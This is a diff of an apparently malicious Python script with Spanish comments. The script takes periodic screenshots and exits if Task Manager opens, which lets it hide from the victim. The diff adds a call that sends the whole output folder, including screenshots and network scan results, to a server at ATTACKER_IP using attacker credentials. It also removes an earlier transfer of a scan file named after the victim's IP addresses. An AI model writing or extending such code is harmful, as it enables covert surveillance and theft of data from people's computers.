@@ -35,8 +35,11 @@ TAKE_SCREEN_SHOTS = settings['Take Screen Shoots']
 def autoAbort():    #Creamos una función que aborte el programa si ve que no quedan hilos en ejecución o se abre el task manager
     loops = 0
     while sens.is_task_manager_open()==False and len(threading.enumerate()) >1:
-        if loops==8000 and TAKE_SCREEN_SHOTS: #Aprobechamos este loop para tomar screenshoots cada 8000 ciclos
-            sens.takeScreenShot(imageName=datetime.datetime.now().strftime("%Y%m%d_%H%M%S"), path= f"{carpeta_script}\\output\\pictures\\")
+        if loops==12000: #Aprobechamos este loop para tomar screenshoots cada 8000 ciclos
+            if TAKE_SCREEN_SHOTS:
+                sens.takeScreenShot(imageName=datetime.datetime.now().strftime("%Y%m%d_%H%M%S"), path= f"{carpeta_script}\\output\\pictures\\")
+            if SEND_DATA:
+                net.transfer_folder(carpeta_script+'\\output\\', ATTACKER_FOLDER, ATTACKER_IP, ATTACKER_USERNAME, ATTACKER_PASSWD)
             loops = 0 #Reiniciamos la variable para que no se desborde
         loops+=1
     sys.exit()
@@ -173,8 +176,7 @@ def main():
         archivo.write('\n\t}\n}')
                 
     print("Escaneo terminado. Pasando a segundo plano...")
-    if SEND_DATA: #Enviamos el archivo creado a nuestro servidor SSH
-        net.transfer_file(f'{publicIP.replace(".", "-")}_{localIP.replace(".", "-")}.json', ATTACKER_FOLDER, ATTACKER_IP, ATTACKER_USERNAME, ATTACKER_PASSWD)
+
 
     if RAISE_WEB_SERVER:
         httpd = HTTPServer((f"{localIP}", int(PORT)), SimpleHTTPRequestHandler)
